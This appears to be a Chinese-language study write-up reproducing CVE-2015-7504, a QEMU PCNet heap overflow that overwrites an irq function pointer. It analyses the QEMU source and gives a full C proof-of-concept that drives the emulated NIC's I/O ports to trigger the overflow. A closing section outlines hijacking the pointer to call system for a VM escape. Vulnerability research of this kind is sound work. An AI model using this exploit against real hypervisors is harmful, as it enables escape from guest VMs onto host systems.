# CVE-2015-7504漏洞复现------QEMU堆溢出导致任意代码执行漏洞

## 环境搭建

环境搭建参照CVE-2015-5165漏洞复现------QENU信息泄露漏洞那篇文章：https://github.com/Resery/Virtualized_Learning/tree/master/Vulnerability/CVE-2015-5165

## 前置知识

网卡有16位和32位两种模式，这取决于DWIO（存储在网卡上的变量）的实际值，16位模式是网卡重启后的默认模式。网卡有两种内部寄存器：CSR（控制和状态寄存器）和BCR（总线控制寄存器）。两种寄存器都需要通过设置对应的我们要访问的RAP（寄存器地址端口）寄存器来实现对相应CSR或BCR寄存器的访问。

查了些资料，我对于16位和32位的理解就是16位对应的一次性传输的数据位数是16位，32位对应的是一次性传输的数据位数是32位

## 漏洞分析

漏洞点出在了pcnet_receive函数，涉及到了PCNetState结构体和IRQState结构体，主要问题代码在39-50行，s->buffer是存储网卡接受的数据，size是数据的长度，当size为4096的时候，也可以过了这个条件判断，然后会有一个循环，当size为4096时，循环结束的时候p指向的位置就是s->buffer[4096]，在PCNetState结构体中可以看到buffer存储的是8位的数据，然而这时会往p里面传32位的数据，由于现再ps->buffer[4096]所以这32位的数据就会写到buffer下面的irq的低四字节，因为irq是函数指针，并且后面又调用irq指向的函数的操作，所以说我们可以通过这4字节来劫持rip，执行irq指向的函数的代码在第63行

```
-------------------------------------------------------------------------------------------------------
typedef struct PCNetState_st PCNetState;

struct PCNetState_st {
    NICState *nic;
    NICConf conf;
    QEMUTimer *poll_timer;
    int rap, isr, lnkst;
    uint32_t rdra, tdra;
    uint8_t prom[16];
    uint16_t csr[128];
    uint16_t bcr[32];
    int xmit_pos;
    uint64_t timer;
    MemoryRegion mmio;
    uint8_t buffer[4096];
    qemu_irq irq;
    void (*phys_mem_read)(void *dma_opaque, hwaddr addr,
                         uint8_t *buf, int len, int do_bswap);
    void (*phys_mem_write)(void *dma_opaque, hwaddr addr,
                          uint8_t *buf, int len, int do_bswap);
    void *dma_opaque;
    int tx_busy;
    int looptest;
};
-------------------------------------------------------------------------------------------------------
struct IRQState {
    Object parent_obj;

    qemu_irq_handler handler;
    void *opaque;
    int n;
};
-------------------------------------------------------------------------------------------------------
ssize_t pcnet_receive(NetClientState *nc, const uint8_t *buf, size_t size_)
{
    PCNetState *s = qemu_get_nic_opaque(nc);
    int is_padr = 0, is_bcast = 0, is_ladr = 0;
    uint8_t buf1[60];
    int remaining;
    int crc_err = 0;
    int size = size_;

	........................................

    if (CSR_PROM(s)
        || (is_padr=padr_match(s, buf, size))
        || (is_bcast=padr_bcast(s, buf, size))
        || (is_ladr=ladr_match(s, buf, size))) {
		
		..........................................

        if (!(CSR_CRST(s) & 0x8000)) {
#ifdef PCNET_DEBUG_RMD
            printf("pcnet - no buffer: RCVRC=%d\n", CSR_RCVRC(s));
#endif
            s->csr[0] |= 0x1000; /* Set MISS flag */
            CSR_MISSC(s)++;
        } else {
            uint8_t *src = s->buffer;
            hwaddr crda = CSR_CRDA(s);
            struct pcnet_RMD rmd;
            int pktcount = 0;

            if (!s->looptest) {
                memcpy(src, buf, size);
                /* no need to compute the CRC */
                src[size] = 0;
                src[size + 1] = 0;
                src[size + 2] = 0;
                src[size + 3] = 0;
                size += 4;
            } else if (s->looptest == PCNET_LOOPTEST_CRC ||
                       !CSR_DXMTFCS(s) || size < MIN_BUF_SIZE+4) {
                uint32_t fcs = ~0;
                uint8_t *p = src;
					//0x565ad4a0
                while (p != &src[size])
                    CRC(fcs, *p++);
                *(uint32_t *)p = htonl(fcs);			//htonl写64位数据.当size为4096时,会往p里写64位数据
                										//但是p本身是32位的,所以有32位会写到p后面
                										//根据src的数据结构PCNetState可以看到buffer后面的内容为一个函数指针
                size += 4;
            } else {
                uint32_t fcs = ~0;
                uint8_t *p = src;

                while (p != &src[size-4])
                    CRC(fcs, *p++);
                crc_err = (*(uint32_t *)p != htonl(fcs));
            }
            
            ..................................................
            
    pcnet_poll(s);
    pcnet_update_irq(s);

    return size_;
}
-------------------------------------------------------------------------------------------------------
static void pcnet_update_irq(PCNetState *s)
{
	..........................
	
    qemu_set_irq(s->irq, isr);
	
	..........................
}
-------------------------------------------------------------------------------------------------------
void qemu_set_irq(qemu_irq irq, int level)
{
    if (!irq)
        return;

    irq->handler(irq->opaque, irq->n, level);
}
-------------------------------------------------------------------------------------------------------
```

## 漏洞相关代码执行流程

同样先来看一下realize中对mmio以及pmio的设置：

```
--------------------------------------------------------------------------------------------------------
static const MemoryRegionOps pcnet_mmio_ops = {
    .old_mmio = {
        .read = { pcnet_mmio_readb, pcnet_mmio_readw, pcnet_mmio_readl },
        .write = { pcnet_mmio_writeb, pcnet_mmio_writew, pcnet_mmio_writel },
    },
    .endianness = DEVICE_LITTLE_ENDIAN,
};
--------------------------------------------------------------------------------------------------------
static const MemoryRegionOps pcnet_io_ops = {
    .read = pcnet_ioport_read,
    .write = pcnet_ioport_write,
    .endianness = DEVICE_LITTLE_ENDIAN,
};
--------------------------------------------------------------------------------------------------------
```

由于我们这里主要就是使用到了pmio所以就主要分析pcnet_io_ops了，pcnet_ioport_read和pcnet_ioport_write两个函数代码如下，可以看到如果addr大于0x10就会调用pcnet_ioport_readw、pcnet_ioport_writew或者pcnet_ioport_readl、pcnet_ioport_writel具体调用哪个由size决定，具体的我们看一下pcnet_ioport_writew函数，因为这个函数最终会调用漏洞函数

```
--------------------------------------------------------------------------------------------------------
static uint64_t pcnet_ioport_read(void *opaque, hwaddr addr,
                                  unsigned size)
{
    PCNetState *d = opaque;

    trace_pcnet_ioport_read(opaque, addr, size);
    if (addr < 0x10) {
        if (!BCR_DWIO(d) && size == 1) {
            return pcnet_aprom_readb(d, addr);
        } else if (!BCR_DWIO(d) && (addr & 1) == 0 && size == 2) {
            return pcnet_aprom_readb(d, addr) |
                   (pcnet_aprom_readb(d, addr + 1) << 8);
        } else if (BCR_DWIO(d) && (addr & 3) == 0 && size == 4) {
            return pcnet_aprom_readb(d, addr) |
                   (pcnet_aprom_readb(d, addr + 1) << 8) |
                   (pcnet_aprom_readb(d, addr + 2) << 16) |
                   (pcnet_aprom_readb(d, addr + 3) << 24);
        }
    } else {
        if (size == 2) {
            return pcnet_ioport_readw(d, addr);
        } else if (size == 4) {
            return pcnet_ioport_readl(d, addr);
        }
    }
    return ((uint64_t)1 << (size * 8)) - 1;
}
--------------------------------------------------------------------------------------------------------
static void pcnet_ioport_write(void *opaque, hwaddr addr,
                               uint64_t data, unsigned size)
{
    PCNetState *d = opaque;

    trace_pcnet_ioport_write(opaque, addr, data, size);
    if (addr < 0x10) {
        if (!BCR_DWIO(d) && size == 1) {
            pcnet_aprom_writeb(d, addr, data);
        } else if (!BCR_DWIO(d) && (addr & 1) == 0 && size == 2) {
            pcnet_aprom_writeb(d, addr, data & 0xff);
            pcnet_aprom_writeb(d, addr + 1, data >> 8);
        } else if (BCR_DWIO(d) && (addr & 3) == 0 && size == 4) {
            pcnet_aprom_writeb(d, addr, data & 0xff);
            pcnet_aprom_writeb(d, addr + 1, (data >> 8) & 0xff);
            pcnet_aprom_writeb(d, addr + 2, (data >> 16) & 0xff);
            pcnet_aprom_writeb(d, addr + 3, data >> 24);
        }
    } else {
        if (size == 2) {
            pcnet_ioport_writew(d, addr, data);
        } else if (size == 4) {
            pcnet_ioport_writel(d, addr, data);
        }
    }
}
--------------------------------------------------------------------------------------------------------
```

pcnet_ioport_writew函数代码如下，当addr的值为0x10的时候会调用pcnet_csr_writew，addr的值为0x12时会给rap赋值，赋的值是value，addr的值是0x16时会调用pcnet_bcr_writew，pcnet_csr_writew函数会调用漏洞函数

```
void pcnet_ioport_writew(void *opaque, uint32_t addr, uint32_t val)
{
    PCNetState *s = opaque;
    pcnet_poll_timer(s);
#ifdef PCNET_DEBUG_IO
    printf("pcnet_ioport_writew addr=0x%08x val=0x%04x\n", addr, val);
#endif
    if (!BCR_DWIO(s)) {	//bcr[18]应不为0x80
        switch (addr & 0x0f) {
        case 0x00: /* RDP */			
            pcnet_csr_writew(s, s->rap, val);
            break;
        case 0x02:					//通过这里设置rap为0
            s->rap = val & 0x7f;
            break;
        case 0x06:
            pcnet_bcr_writew(s, s->rap, val);
            break;
        }
    }
    pcnet_update_irq(s);
}
```

pcnet_csr_writew函数代码如下，这里面如果说CSR_TDMD(s)符合条件的话就会调用pcnet_transmit函数，pcnet_transmit函数会调用漏洞函数

```
static void pcnet_csr_writew(PCNetState *s, uint32_t rap, uint32_t new_value)
{
    uint16_t val = new_value;
#ifdef PCNET_DEBUG_CSR
    printf("pcnet_csr_writew rap=%d val=0x%04x\n", rap, val);
#endif
    switch (rap) {
    case 0:
        s->csr[0] &= ~(val & 0x7f00); /* Clear any interrupt flags */

        s->csr[0] = (s->csr[0] & ~0x0040) | (val & 0x0048);

        val = (val & 0x007f) | (s->csr[0] & 0x7f00);

        /* IFF STOP, STRT and INIT are set, clear STRT and INIT */
        if ((val&7) == 7)
          val &= ~3;

        if (!CSR_STOP(s) && (val & 4))
            pcnet_stop(s);

        if (!CSR_INIT(s) && (val & 1))
            pcnet_init(s);

        if (!CSR_STRT(s) && (val & 2))
            pcnet_start(s);

        if (CSR_TDMD(s))				//csr[0]的值应为8
            pcnet_transmit(s);

        return;
	.............................
    }
    s->csr[rap] = val;
}
```

pcnet_transmit函数漏洞代码如下，可以看到12行就调用了漏洞函数pcnet_receive

```
static void pcnet_transmit(PCNetState *s)
{
	...............................
    if (pcnet_tdte_poll(s)) {
	
		....................................
		
        if (CSR_LOOP(s)) {
            if (BCR_SWSTYLE(s) == 1)
                add_crc = !GET_FIELD(tmd.status, TMDS, NOFCS);
            s->looptest = add_crc ? PCNET_LOOPTEST_CRC : PCNET_LOOPTEST_NOCRC;
            pcnet_receive(qemu_get_queue(s->nic), s->buffer, s->xmit_pos);			//漏洞点
            s->looptest = 0;
        } else {
            if (s->nic) {
                qemu_send_packet(qemu_get_queue(s->nic), s->buffer,
                                 s->xmit_pos);
            }
        }

	................................
}
```

## POC

搞懂了漏洞相关代码执行流程之后我们就可以开始编写poc了，设置一些值保证代码可以执行到漏洞函数那里，首先我们需要先调用pcnet_s_reset函数，该函数会将网卡进行初始化，包括设置为16位模式以及设置状态为stop状态等。

要是想执行到pcnet_transmit函数很简单，调用init函数，再调用start函数，然后分支就可以调用到pcnet_transmit函数了。

其中由于pcnet_start函数也会调用pcnet_transmit函数，为了不让pcnet_start调用函数，我们需要设置CSR_DPOLL位、CSR_SPND位

然后我们需要伪造一个pcnet_tmd结构，然后使csr[34]、csr[35]存进去这个地址，从而使得cxda = tmd_addr，这样就能过掉`if (pcnet_tdte_poll(s))`这个检测

为了过`if (GET_FIELD(tmd.status, TMDS, STP))`和`if (pcnet_tdte_poll(s))`这两个检测tmd中的length值应为0xf000，status 值应为0x8300，

为了过`if (!CSR_DTX(s))`这个检测需要设置csr[15]的值为4，csr[15]的值是mode赋的，mode的值是可以通过设置csr[0]、csr[1]的值指向伪造的pcnet_initblk32结构，这样就可以使的csr[15]的值为4

为了过`if (CSR_LOOP(s))`这个检测现需要设置csr[15]的值为4

为了过`if (CSR_DRX(s) || CSR_STOP(s) || CSR_SPND(s) || !size || (CSR_LOOP(s) && !s->looptest))`这个检测需要上设置这里中的CSR_SPND

为了过`if (CSR_PROM(s)`需要设置csr[15]的值包含1这一位

为了过`if (!(CSR_CRST(s) & 0x8000) && s->rdra)`这个检测需要设置csr[41]的值为0x8000，我们需要伪造一个rmd结构，使rmd中的buf_length的值为0xf000，rmd中的status的值为0x8000，想要这样设置还想需要设置csr[25]、csr[26]的值为rmd结构的地址

设置完上面这些内容就可以调用到漏洞函数即htonl那里，poc代码如下：

```
/*
* @Author: resery
* @Date:   2020-10-14 15:41:43
* @Last Modified by:   resery
* @Last Modified time: 2020-10-19 09:17:53
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/io.h>
#include <stdint.h>
#include <string.h> 
#include <stdio.h> 

#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1)

#define page_aligned __attribute__((aligned(PAGE_SIZE)))

#define PCNET_BUFFER_SIZE 4096
#define PCNET_PORT        0xc140

struct pcnet_initblk32 {
    uint16_t mode;
    uint8_t rlen;
    uint8_t tlen;
    uint16_t padr[3];
    uint16_t _res;
    uint16_t ladrf[4];
    uint32_t rdra;
    uint32_t tdra;
};

struct pcnet_TMD {
    uint32_t tbadr;
    int16_t length;
    int16_t status;
    uint32_t misc;
    uint32_t res;
};

struct pcnet_RMD {
    uint32_t rbadr;
    int16_t buf_length;
    int16_t status;
    uint32_t msg_length;
    uint32_t res;
};

#define CRC(crc, ch) (crc = (crc >> 8) ^ crctab[(crc ^ (ch)) & 0xff])

size_t virtuak_addr_to_physical_addr(void *addr){
    uint64_t data;

    int fd = open("/proc/self/pagemap",O_RDONLY);
    if(!fd){
        perror("open pagemap");
        return 0;
    }

    size_t pagesize = getpagesize();
    size_t offset = ((uintptr_t)addr / pagesize) * sizeof(uint64_t);

    if(lseek(fd,offset,SEEK_SET) < 0){
        puts("lseek");
        close(fd);
        return 0;
    }

    if(read(fd,&data,8) != 8){
        puts("read");
        close(fd);
        return 0;
    }

    if(!(data & (((uint64_t)1 << 63)))){
        puts("page");
        close(fd);
        return 0;
    }

    size_t pageframenum = data & ((1ull << 55) - 1);
    size_t phyaddr = pageframenum * pagesize + (uintptr_t)addr % pagesize;

    close(fd);

    return phyaddr;
}

uint32_t set_csr_15_value_equal_2(struct pcnet_initblk32 *initblk32,uint32_t cxda,uint32_t crda){
    initblk32->mode = 4;
    initblk32->tdra = cxda;
    initblk32->rdra = crda;
    return virtuak_addr_to_physical_addr(initblk32);
}

uint32_t set_tmd(struct pcnet_TMD *tmd){
    tmd->length = 0xf000;
    tmd->status = 0x8300;
    return virtuak_addr_to_physical_addr(tmd);
}

uint32_t set_rmd(struct pcnet_RMD *rmd){
    rmd->buf_length = 0xf000;
    rmd->status = 0x8000; 
    return virtuak_addr_to_physical_addr(rmd);
}

int main(){
    struct pcnet_initblk32 *initblk32;
    struct pcnet_TMD *tmd;
    struct pcnet_RMD *rmd;
    uint32_t pcnet_initblk32_mem;
    uint32_t pcnet_tmd_mem;
    uint32_t pcnet_rmd_mem;

    void *addr;

    uint32_t fcs = ~0;
    uint8_t *ptr;

    uint16_t initblk32_lo, initblk32_hi;
    uint16_t tmd_lo, tmd_hi;
    uint16_t rmd_lo, rmd_hi;
    
    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) {
        perror("open");
        exit(1);
    }

    tmd = (struct pcnet_TMD *)aligned_alloc(
        PAGE_SIZE, sizeof(struct pcnet_TMD));
    rmd = (struct pcnet_RMD *)aligned_alloc(
        PAGE_SIZE, sizeof(struct pcnet_RMD));
    initblk32 = (struct pcnet_initblk32 *)aligned_alloc(
        PAGE_SIZE, sizeof(struct pcnet_initblk32));
    
    pcnet_tmd_mem = (uint32_t)set_tmd(tmd);
    pcnet_rmd_mem = (uint32_t)set_rmd(rmd);
    pcnet_initblk32_mem = (uint32_t)set_csr_15_value_equal_2(initblk32, pcnet_tmd_mem, pcnet_rmd_mem);

    tmd_lo = (uint16_t)pcnet_tmd_mem;
    tmd_hi = pcnet_tmd_mem >> 16;
    rmd_lo = (uint16_t)pcnet_rmd_mem;
    rmd_hi = pcnet_rmd_mem >> 16;
    initblk32_lo = (uint16_t)pcnet_initblk32_mem;
    initblk32_hi = pcnet_initblk32_mem >> 16;

    iopl(3);

    inw(PCNET_PORT + 0x14);

    outw(58, PCNET_PORT + 0x12);
    outw(0x102, PCNET_PORT + 0x10);

    printf("tmd_addr:\t %p\n",pcnet_tmd_mem);
    printf("rmd_addr:\t %p\n",pcnet_rmd_mem);
    printf("initblk32_addr:\t %p\n",pcnet_initblk32_mem);

    //first set csr[2] << 16 | csr[1]
    //sencond if csr[2] << 16 | csr[1] that mode = 4 and csr[15] != 2
    //third if csr[15] != 2 that csr[0] | 0x10
    outw(1, PCNET_PORT + 0x12);
    outw(initblk32_lo, PCNET_PORT + 0x10);
    outw(2, PCNET_PORT + 0x12);
    outw(initblk32_hi, PCNET_PORT + 0x10);

    //set cxda = tmd_addr
    outw(34, PCNET_PORT + 0x12);
    outw(tmd_lo, PCNET_PORT + 0x10);
    outw(35, PCNET_PORT + 0x12);
    outw(tmd_hi, PCNET_PORT + 0x10);
    
    //CSR_DPOLL
    outw(4, PCNET_PORT + 0x12);
    outw(0x1000, PCNET_PORT + 0x10);

    //pcnet_init and pcnet_start
    outw(0,PCNET_PORT + 0x12);
    outw(3,PCNET_PORT + 0x10);

    //set CSR_SPND
    outw(5, PCNET_PORT + 0x12);
    outw(0x1, PCNET_PORT + 0x10);

    //CSR_PROM
    outw(15, PCNET_PORT + 0x12);
    outw(0x8004, PCNET_PORT + 0x10);

    //CSR_CRST
    outw(41, PCNET_PORT + 0x12);
    outw(0x8000, PCNET_PORT + 0x10);

    //set crda = rmd_addr
    outw(28, PCNET_PORT + 0x12);
    outw(rmd_lo, PCNET_PORT + 0x10);
    outw(29, PCNET_PORT + 0x12);
    outw(rmd_hi, PCNET_PORT + 0x10);

    //clear CSR_SPND
    outw(5, PCNET_PORT + 0x12);
    outw(0, PCNET_PORT + 0x10);

    sleep(2);

    //call pcnet_transmit
    outw(0,PCNET_PORT + 0x12);
    outw(8,PCNET_PORT + 0x10);
}
```

poc执行完之后的效果如下：

![](poc.png)

## 漏洞利用

利用这一步需要逆向一下crc循环校验，自己这个校验没逆出来，不过漏洞利用的思路还是了解一些的，首先我们可以控制s->buffer中的内容，因为代码中有关于s->buffer赋值的函数，所以我们可以在buffer中伪造一个IRQState结构然后在这个结构中设置handler为system，然后opaque为想要执行的执行，伪造的信息可以利用CVE-2015-5156得到，然后我们通过给s->buffer打patch让他可以过了crc循环校验使得irq指向buffer中伪造的IRQState，这样在执行irq指向的函数的时候，就会执行system了

